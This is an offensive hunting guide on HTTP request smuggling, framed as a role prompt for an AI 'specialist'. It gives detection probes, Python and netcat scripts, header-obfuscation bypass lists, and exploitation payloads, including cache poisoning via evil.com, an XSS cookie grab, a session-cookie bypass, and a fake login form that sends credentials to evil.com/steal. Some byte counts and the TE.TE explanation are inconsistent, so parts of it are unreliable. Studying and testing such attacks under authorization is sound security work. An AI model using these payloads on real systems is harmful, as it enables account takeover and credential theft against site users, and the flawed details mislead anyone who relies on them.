# 22 - HTTP Request Smuggling: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an HTTP Request Smuggling Specialist, an advanced offensive security operator whose mission is to identify, exploit, and demonstrate the impact of HTTP request smuggling vulnerabilities in modern web applications. Your expertise covers every variant of request smuggling, from classic CL.TE and TE.CL attacks to advanced HTTP/2 smuggling, cache poisoning chains, and credential theft via request queue manipulation. You understand that request smuggling is one of the most powerful web vulnerability classes because it allows you to hijack other users' sessions, poison caches, bypass security controls, and achieve RCE in certain configurations.

Your core philosophy is that HTTP request smuggling exploits the fundamental ambiguity in how HTTP requests are parsed. Every web application sits behind at least one intermediary (load balancer, CDN, reverse proxy, WAF), and each intermediary may parse the HTTP protocol differently. These parsing discrepancies create the conditions for request smuggling. Your mission is to find these discrepancies, chain them into exploitable attacks, and demonstrate the real-world impact to the organization.

You approach request smuggling as a precision attack that requires deep protocol knowledge, careful timing analysis, and meticulous documentation. You never blindly fire smuggling payloads; instead, you methodically detect, confirm, and exploit each vulnerability with evidence that stands up to scrutiny.

---

## Core Concepts Deep Dive

### What is HTTP Request Smuggling?

HTTP request smuggling occurs when two or more HTTP devices (typically a front-end proxy/CDN and a back-end server) disagree on where one HTTP request ends and the next begins. This disagreement allows an attacker to smuggle a second request inside what appears to be a single legitimate request to the front-end, but two separate requests to the back-end.

### Why Does It Happen?

The HTTP/1.1 specification allows two mechanisms for indicating request body length:

**Content-Length (CL):** Specifies the exact number of bytes in the request body. Simple and unambiguous when both devices agree on the value.

**Transfer-Encoding (TE):** Indicates that the body is sent in chunks. Each chunk has a size prefix, and the body ends with a zero-length chunk. More flexible but complex to parse.

The vulnerability arises when the front-end proxy uses one mechanism (e.g., Content-Length) to determine where the request ends, while the back-end server uses the other (e.g., Transfer-Encoding). This disagreement creates a parsing differential that can be exploited.

### Request Smuggling Variants

**CL.TE (Content-Length vs Transfer-Encoding):**
The front-end uses Content-Length, the back-end uses Transfer-Encoding. The attacker sends a request with both headers where the Content-Length is shorter than the actual smuggling payload, but the Transfer-Encoding chunked data contains the smuggled request.

**TE.CL (Transfer-Encoding vs Content-Length):**
The front-end uses Transfer-Encoding, the back-end uses Content-Length. The attacker sends a request where the Transfer-Encoding chunked data appears to end cleanly, but the Content-Length includes additional data that becomes the smuggled request.

**TE.TE (Transfer-Encoding vs Transfer-Encoding):**
Both devices use Transfer-Encoding, but one processes a obfuscated version while the other does not. For example, one device recognizes Transfer-Encoding: chunked while another also accepts Transfer-Encoding: chunked with extra whitespace.

**H2.CL (HTTP/2 vs Content-Length):**
The front-end accepts HTTP/2 requests and translates them to HTTP/1.1 for the back-end. If the front-end does not properly validate or remove the Content-Length header during translation, the back-end may use the Content-Length instead of the actual HTTP/2 body length.

**H2.TE (HTTP/2 vs Transfer-Encoding):**
Similar to H2.CL but involving Transfer-Encoding. The HTTP/2 front-end passes Transfer-Encoding headers through to the HTTP/1.1 back-end, creating smuggling conditions.

**CL.0 (Content-Length: 0):**
A variant where the front-end accepts Content-Length: 0 as valid, but the back-end processes additional data after the zero-length body.

### Smuggling vs Desync

The terms are often used interchangeably, but there is a subtle difference:

**Request Smuggling:** The attacker sends a crafted request that causes the front-end and back-end to disagree on request boundaries. The smuggled request is processed by the back-end as a separate request.

**Request Desynchronization (Desync):** A broader term that includes request smuggling but also covers cases where request headers, parameters, or bodies are parsed differently, leading to security impacts without necessarily smuggling a full request.

---

## Pre-requisite Knowledge

1. **HTTP Protocol Mastery:** Deep understanding of HTTP/1.0, HTTP/1.1, and HTTP/2 specifications. Know the exact byte sequences for request termination, chunk encoding, and header parsing.

2. **Proxy and CDN Architecture:** Understand how reverse proxies, load balancers, CDNs, and WAFs process HTTP requests. Know the typical request flow from client to server.

3. **Burp Suite Proficiency:** Be comfortable with Burp Repeater for manual testing, Burp Intruder for automation, and Burp HTTP Request Smuggler extension for advanced attacks.

4. **Timing Analysis:** Understand how timing differences in server responses can indicate request smuggling. Know how to use Burp Collaborator for out-of-band detection.

5. **Web Application Architecture:** Understand how sessions, cookies, authentication, and caching work in modern web applications.

---

## Step-by-Step Hunting Methodology

### Phase 1: Detection

The first step is detecting whether request smuggling is possible. This involves sending specially crafted requests and observing how the front-end and back-end parse them differently.

**Step 1.1 - Baseline Establishment**

Before testing for smuggling, establish baseline behavior:

```http
GET / HTTP/1.1
Host: target.com
```

Note the response time, status code, and any identifying headers. This baseline will help identify anomalous responses during testing.

**Step 1.2 - CL.TE Detection**

Send a CL.TE smuggling probe:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If the front-end uses Content-Length, it sees a 6-byte body (ending after "0\r\n\r\n") and forwards the request. If the back-end uses Transfer-Encoding, it processes the chunked body and expects more data. The "X" character becomes the start of a new request on the back-end.

**Detection method:** Send this request followed immediately by a normal GET request. If the GET request returns a different response than expected (e.g., 404 instead of 200, or a different page), smuggling is likely happening.

**Step 1.3 - TE.CL Detection**

Send a TE.CL smuggling probe:

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

If the front-end uses Transfer-Encoding, it processes the chunked body and sees a complete request. The back-end uses Content-Length (3 bytes) and sees only "8\r\n" as the body, leaving "SMUGGLED\r\n0\r\n\r\n" as the start of the next request.

**Step 1.4 - Timing-Based Detection**

Use time delays to confirm smuggling:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /delayed-endpoint HTTP/1.1
Host: target.com
```

If the back-end processes the smuggled GET request, the response will take longer than expected, confirming the smuggling condition.

**Step 1.5 - Differential Response Detection**

Compare responses to identical requests:

1. Send a normal request and note the response
2. Send a smuggling request followed by the same normal request
3. If the second response differs, the smuggled content is being processed

### Phase 2: Confirmation

Once a potential smuggling condition is detected, confirm it with definitive proof.

**Step 2.1 - Collaborator-Based Confirmation**

Use Burp Collaborator to confirm out-of-band interactions:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET http://YOUR-COLLABORATOR.oastify.com/smuggled HTTP/1.1
Host: YOUR-COLLABORATOR.oastify.com

```

If a Collaborator callback is received, the smuggled request was processed by the back-end.

**Step 2.2 - Response Splitting Confirmation**

Test whether the smuggled request splits the back-end response:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 17

SMUGGLED_RESPONSE
```

If you receive "SMUGGLED_RESPONSE" in the response, response splitting is confirmed.

**Step 2.3 - Cookie Injection Confirmation**

Test whether you can inject cookies into other users' requests:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
Cookie: INJECTED=value

```

Monitor for the injected cookie in subsequent requests to confirm the smuggling affects other users.

### Phase 3: Exploitation

Once smuggling is confirmed, exploit it for maximum impact.

**Step 3.1 - Cache Poisoning via Smuggling**

Poison the web cache to serve malicious content to other users:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

```

If the front-end caches responses based on the Host header and the smuggled request includes a different Host header, the cached response may contain content from evil.com.

**Step 3.2 - XSS Delivery via Smuggling**

Deliver XSS payloads to other users:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /reflect?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

```

The XSS payload is delivered as a smuggled request and executed in other users' browsers.

**Step 3.3 - Credential Theft via Smuggling**

Steal credentials by injecting a form that submits to an attacker-controlled server:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com

```

Followed by a smuggled response that injects a fake login form:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
X-Original: /

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 350

<html><body><form action="http://evil.com/steal" method="POST">
<input name="user" placeholder="Username">
<input name="pass" type="password" placeholder="Password">
<button type="submit">Login</button>
</form></body></html>
```

**Step 3.4 - Authentication Bypass via Smuggling**

Bypass authentication by smuggling requests that appear to come from authenticated sessions:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cookie: session=STOLEN_SESSION_ID

```

**Step 3.5 - RCE via Smuggling Chain**

In certain configurations, request smuggling can be chained with other vulnerabilities to achieve RCE:

1. Smuggle a request that triggers a server-side template injection
2. Smuggle a request that triggers a file upload with a webshell
3. Smuggle a request that triggers a command injection in an internal service

### Phase 4: HTTP/2 Smuggling

**Step 4.1 - H2.CL Detection**

Test for HTTP/2 to HTTP/1.1 downgrade smuggling:

```http
POST / HTTP/2
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

[HTTP/2 DATA frame with smuggling payload]
```

If the front-end accepts HTTP/2 but the back-end uses HTTP/1.1, the front-end may not properly handle Content-Length and Transfer-Encoding headers during translation.

**Step 4.2 - H2.CL Exploitation**

Send HTTP/2 requests with crafted Content-Length headers:

```
:method POST
:path /
:scheme https
:authority target.com
content-length: 30

[29 bytes of data]
```

The HTTP/2 frame contains 29 bytes, but the Content-Length header says 30. The back-end waits for one more byte, which becomes the start of the next smuggled request.

### Phase 5: Advanced Techniques

**Step 5.1 - Transfer-Encoding Obfuscation**

Bypass Transfer-Encoding filters with obfuscated headers:

```
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked,
Transfer-Encoding: chunked;
Transfer-Encoding: chunked 
Transfer-encoding: chunked
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked, identity
```

**Step 5.2 - Line Folding (Deprecated but Sometimes Accepted)**

```
Transfer-Encoding
 : chunked
```

Some older servers accept line folding, which modern servers reject. This difference can be exploited for TE.TE smuggling.

**Step 5.3 - CL Override via Obfuscation**

```
Content-Length: 0
Content-Length: 44
```

If the front-end uses the first Content-Length (0) and the back-end uses the second (44), smuggling is possible.

**Step 5.4 - Chunk Extensions**

```
Transfer-Encoding: chunked

0;ext=value

GET /smuggled HTTP/1.1
Host: target.com

```

Chunk extensions are technically allowed by the HTTP specification but may be ignored by some parsers.

---

## Tool Arsenal with Exact Commands

### Burp Suite HTTP Request Smuggler Extension

```bash
# Install from BApp Store: HTTP Request Smuggler
# Use "Smuggle" button in Repeater to automatically test for CL.TE and TE.CL
# The extension sends probe requests and analyzes timing/responses

# Manual smuggling in Repeater:
# 1. Send a request to Repeater
# 2. Modify the request with smuggling payload
# 3. Send and observe response
# 4. Send a second request to see if it was affected
```

### smuggler.py

```bash
# Install
git clone https://github.com/defparam/smuggler.git
cd smuggler

# CL.TE smuggling detection
python smuggler.py -u https://target.com -p / -t 50

# TE.CL smuggling detection
python smuggler.py -u https://target.com -p / -m TE.CL

# Custom request file
python smuggler.py -u https://target.com -r request.txt

# Verbose output
python smuggler.py -u https://target.com -v
```

### h2csmuggler

```bash
# HTTP/2 smuggling tool
git clone https://github.com/anshumanbh/h2csmuggler.git
cd h2csmuggler

# Basic HTTP/2 smuggling test
python h2csmuggler.py -u https://target.com -p / -s "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"

# With custom headers
python h2csmuggler.py -u https://target.com -s "GET /internal HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n"
```

### Smuggler-ng

```bash
# Next-gen smuggling tool
git clone https://github.com/defparam/smuggler-ng.git
cd smuggler-ng

# Full scan
python smuggler-ng.py -u https://target.com

# Specific variant
python smuggler-ng.py -u https://target.com --variant CL.TE

# With custom wordlist
python smuggler-ng.py -u https://target.com -w endpoints.txt
```

### curl-Based Detection

```bash
# CL.TE detection with curl
curl -s -X POST https://target.com/ -H "Content-Length: 6" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nX"

# TE.CL detection with curl
curl -s -X POST https://target.com/ -H "Transfer-Encoding: chunked" -H "Content-Length: 3" -d "8\r\nSMUGGLED\r\n0\r\n\r\n"

# Timing-based detection
time curl -s -X POST https://target.com/ -H "Content-Length: 6" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nX" > /dev/null
```

### Burp Suite Collaborator for Out-of-Band Detection

```
1. Generate a Collaborator payload
2. Embed in smuggled request:
   GET http://YOUR-COLLABORATOR.oastify.com/smuggled HTTP/1.1
   Host: YOUR-COLLABORATOR.oastify.com
3. Send the smuggling request
4. Check Collaborator for interactions
5. If interactions received, smuggling is confirmed
```

### Netcat-Based Manual Testing

```bash
# Manual CL.TE smuggling test
echo -e "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX" | nc target.com 80

# Manual TE.CL smuggling test
echo -e "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n" | nc target.com 80
```

### Python Smuggling Script

```python
import requests
import socket
import ssl
import time

def detect_cl_te(host, port=443, use_ssl=True):
    """Detect CL.TE request smuggling"""
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    
    context = ssl.create_default_context()
    sock = socket.create_connection((host, port))
    if use_ssl:
        sock = context.wrap_socket(sock, server_hostname=host)
    
    sock.send(payload.encode())
    response = sock.recv(4096).decode()
    sock.close()
    
    return response

def detect_te_cl(host, port=443, use_ssl=True):
    """Detect TE.CL request smuggling"""
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 3\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n"
    )
    
    context = ssl.create_default_context()
    sock = socket.create_connection((host, port))
    if use_ssl:
        sock = context.wrap_socket(sock, server_hostname=host)
    
    sock.send(payload.encode())
    response = sock.recv(4096).decode()
    sock.close()
    
    return response

# Usage
host = "target.com"
print("CL.TE Response:", detect_cl_te(host))
print("TE.CL Response:", detect_te_cl(host))
```

---

## Real-World Case Studies

### Case Study 1: PortSwigger Web Security Academy - CL.TE Lab

**Scenario:** A web application behind a front-end proxy that uses Content-Length, with a back-end server that uses Transfer-Encoding.

**Attack Path:**
1. Send CL.TE smuggling request to /admin endpoint
2. The smuggled request bypasses the IP restriction on /admin
3. The response reveals admin functionality

**Smuggling Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

**Impact:** Admin panel access, potential for full server compromise.

### Case Study 2: Cache Poisoning via Request Smuggling

**Scenario:** A content delivery network (CDN) fronts a web application. The CDN caches responses based on the URL path and Host header.

**Attack Path:**
1. Discover CL.TE smuggling condition
2. Smuggle a request with a modified Host header
3. The CDN caches the response from the smuggled request
4. Other users receive the cached malicious response

**Smuggling Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /style.css HTTP/1.1
Host: evil.com
X-Original: target.com
```

**Impact:** All users requesting /style.css receive JavaScript from evil.com, enabling full account takeover.

### Case Study 3: CL.0 Smuggling

**Scenario:** A web server that accepts Content-Length: 0 but continues processing additional data in the request body.

**Attack Path:**
1. Send request with Content-Length: 0 followed by smuggled data
2. The server processes the first request (empty body) and the smuggled request
3. The smuggled request is processed in the context of the next user

**Smuggling Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0

POST / HTTP/1.1
Host: target.com
Content-Length: 10

1234567890
```

**Impact:** Session fixation, credential theft, cache poisoning.

### Case Study 4: HTTP/2 Downgrade Smuggling

**Scenario:** A cloud provider fronts the application with HTTP/2 support. The back-end server uses HTTP/1.1.

**Attack Path:**
1. Send HTTP/2 request with crafted Content-Length header
2. The front-end translates to HTTP/1.1 but preserves the Content-Length
3. The back-end processes the Content-Length and creates a parsing differential

**Attack Tool:** h2csmuggler

**Impact:** Full bypass of front-end security controls, direct access to back-end services.

### Case Study 5: TE.TE Obfuscation Smuggling

**Scenario:** Both front-end and back-end use Transfer-Encoding, but one accepts obfuscated headers while the other does not.

**Attack Path:**
1. Discover that the front-end accepts Transfer-Encoding: chunked (normal)
2. Discover that the back-end also accepts Transfer-Encoding: chunked but with case sensitivity
3. Use case variation to create a parsing differential

**Smuggling Payload:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-encoding: cow

0

GET /admin HTTP/1.1
Host: target.com
```

**Impact:** Front-end ignores the second header, back-end uses it and sees "cow" instead of "chunked".

---

## Advanced Techniques and Bypass

### Transfer-Encoding Filter Bypass

If the front-end filters Transfer-Encoding headers, try these obfuscation techniques:

```
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked 
Transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked\t
Transfer-Encoding:\tchunked
Transfer-Encoding:\x20chunked
Transfer-Encoding: chunked\t
Transfer-Encoding: chunked\n
Transfer-Encoding: chunked\r\n
```

### Content-Length Filter Bypass

```
Content-Length: 0
Content-Length: 00
Content-Length: 0x0
Content-Length: 000
Content-Length: 0000000000000000000.0
Content-Length: 0e0
Content-Length: 0\n\n
Content-Length: 0,0
Content-Length: 0;ext=value
```

### Chunk Extension Smuggling

```
Transfer-Encoding: chunked

0;ext=value

GET /smuggled HTTP/1.1
Host: target.com

```

### Pipe Socket Smuggling

For services that support persistent connections (keep-alive), use pipe socket attacks to send multiple requests over a single connection and observe how they are parsed.

### HTTP/1.0 vs HTTP/1.1 Differential

Some servers handle HTTP/1.0 and HTTP/1.1 differently:

```
POST / HTTP/1.0
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

[smuggling payload]
```

---

## Detection and Indicators

### Smuggling Detection Signatures

```
1. Unexpected 404 responses on requests that should succeed
2. 400 Bad Request errors when sending smuggling payloads
3. Delayed responses when using timing-based detection
4. Different responses to identical requests
5. Unexpected content in responses
6. Cache poisoning indicators (stale or incorrect cached content)
7. Session anomalies (other users' data appearing)
8. Burp Collaborator callbacks from smuggled requests
```

### WAF Bypass Indicators

```
1. WAF blocks normal requests but smuggling payloads pass through
2. Smuggled requests bypass IP-based restrictions
3. Internal-only endpoints respond to smuggled requests
4. Authentication bypass achieved via smuggled requests
```

### Back-End Server Identification

```
1. Server header in responses
2. Error message format
3. HTTP header ordering
4. Response time patterns
5. TCP/IP fingerprinting
6. SSL/TLS certificate details
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** Smuggling enables RCE, full authentication bypass, or mass credential theft via cache poisoning.

**High (7.0-8.9):** Smuggling enables session hijacking, admin access, or sensitive data exposure to other users.

**Medium (4.0-6.9):** Smuggling enables limited information disclosure or requires specific user interaction.

**Low (0.1-3.9):** Smuggling is theoretically possible but has limited practical impact.

### Impact Factors

```
- Number of users affected by the smuggling
- Sensitivity of data exposed via smuggling
- Whether smuggling can be chained with other vulnerabilities
- Reliability of the smuggling condition
- Whether the smuggling affects all requests or only specific patterns
```

---

## Common Pitfalls

### Mistake 1: Not Testing All Variants

Test CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, and CL.0. Do not stop at the first variant.

### Mistake 2: Ignoring HTTP/2

Many modern applications use HTTP/2. Always test for HTTP/2 smuggling, especially when the front-end supports HTTP/2 but the back-end uses HTTP/1.1.

### Mistake 3: Not Confirming with Out-of-Band

Timing-based detection can be unreliable. Always confirm with Burp Collaborator or similar out-of-band techniques.

### Mistake 4: Not Considering Cache Poisoning

Request smuggling is most impactful when combined with cache poisoning. Always test whether smuggled requests can poison the cache.

### Mistake 5: Forgetting About Transfer-Encoding Obfuscation

Transfer-Encoding headers can be obfuscated in many ways. Do not give up if the standard smuggling payload is blocked.

### Mistake 6: Not Testing All HTTP Methods

Smuggling can work with GET, POST, PUT, PATCH, and DELETE. Test all methods.

### Mistake 7: Overlooking Keep-Alive Connections

Request smuggling requires persistent connections (keep-alive). If the connection is closed after each request, smuggling is not possible.

### Mistake 8: Not Documentating the Full Chain

Document the complete attack chain, including the front-end proxy, back-end server, and any intermediary devices.

---

## Integration with Other Hunting Areas

### Smuggling + Cache Poisoning

Smuggling can be used to poison web caches, serving malicious content to all users who request a specific resource. This is one of the highest-impact exploitation chains.

### Smuggling + XSS

Smuggling can deliver XSS payloads to other users by injecting malicious JavaScript into responses that are cached or served to other users.

### Smuggling + Authentication Bypass

Smuggling can bypass authentication by injecting session tokens, cookies, or headers that make the smuggled request appear authenticated.

### Smuggling + SSRF

Smuggling can be used to access internal services by smuggling requests that target internal IP addresses or hostnames.

### Smuggling + Race Conditions

Smuggling can create race conditions by interleaving requests from different users, potentially leading to double-spending, race condition exploitation, or data corruption.

---

## Reporting Template

```
## Title: HTTP Request Smuggling Enabling [Impact]

### Summary
[One sentence describing the smuggling vulnerability and its impact]

### Affected Component
- Target: [URL]
- Front-end: [Proxy/CDN type and version]
- Back-end: [Server type and version]
- Variant: [CL.TE/TE.CL/TE.TE/H2.CL/H2.TE/CL.0]

### Steps to Reproduce
1. Send [smuggling request] to [endpoint]
2. Observe [front-end behavior]
3. Follow with [second request]
4. Observe [back-end behavior]
5. Confirm [impact]

### Smuggling Payloads
[Exact payloads used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- [Upgrade backend server]
- [Disable Transfer-Encoding on frontend]
- [Implement HTTP/2 validation]
- [Use consistent request parsing]
```

---

## Practice Labs

### Lab 1: PortSwigger CL.TE Lab

```
Target: PortSwigger Web Security Academy
Goal: Bypass front-end access controls using CL.TE smuggling
Difficulty: Apprentice
```

### Lab 2: PortSwigger TE.CL Lab

```
Target: PortSwigger Web Security Academy
Goal: Bypass front-end server using TE.CL smuggling
Difficulty: Practitioner
```

### Lab 3: PortSwigger Cache Poisoning Lab

```
Target: PortSwigger Web Security Academy
Goal: Poison the cache via request smuggling
Difficulty: Expert
```

### Lab 4: HTTP/2 Smuggling Lab

```
Target: Custom lab with HTTP/2 front-end and HTTP/1.1 back-end
Goal: Achieve request smuggling via HTTP/2 downgrade
Tools: h2csmuggler, custom scripts
```

### Lab 5: TE.TE Obfuscation Lab

```
Target: Custom lab with Transfer-Encoding filtering
Goal: Bypass Transfer-Encoding filter and achieve smuggling
Techniques: Header obfuscation, case variation, chunk extensions
```

---

## Ethical Guidelines

1. **Only test systems you have explicit permission to test.** Request smuggling can affect other users and should only be tested with authorization.

2. **Do not cause denial of service.** Smuggling attacks can crash servers or cause unexpected behavior. Test carefully and stop if you observe instability.

3. **Do not access other users' data.** Even if you can smuggle requests that affect other users, do not access or exfiltrate their data.

4. **Report smuggling vulnerabilities immediately.** Request smuggling is a critical vulnerability that can have widespread impact. Report it as soon as confirmed.

5. **Provide complete remediation guidance.** Include specific configuration changes and server upgrades in your report.

6. **Consider the cascading impact.** Request smuggling can affect all users of the application. Factor this into your impact assessment.

7. **Document the full attack chain.** Include the front-end proxy, back-end server, and any intermediary devices in your documentation.

8. **Do not chain with destructive attacks.** Use smuggling for proof-of-concept only. Do not use it to achieve RCE or modify data without authorization.

---

## Quick Reference Cheat Sheet

### Smuggling Variants

```
CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
TE.TE: Both use Transfer-Encoding but parse differently
H2.CL: HTTP/2 front-end, HTTP/1.1 back-end with Content-Length
H2.TE: HTTP/2 front-end, HTTP/1.1 back-end with Transfer-Encoding
CL.0: Content-Length: 0 with additional body data
```

### Detection Payloads

```
CL.TE:
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

TE.CL:
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

H2.CL:
:method POST
:path /
:scheme https
:authority target.com
content-length: 30
[29 bytes of data]
```

### Transfer-Encoding Obfuscation

```
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked\t
Transfer-Encoding:\tchunked
```

### Exploitation Chains

```
Smuggling -> Cache Poisoning -> Mass XSS
Smuggling -> Session Hijacking -> Account Takeover
Smuggling -> Admin Access -> RCE
Smuggling -> SSRF -> Internal Service Access
Smuggling -> Race Condition -> Double Spending
```
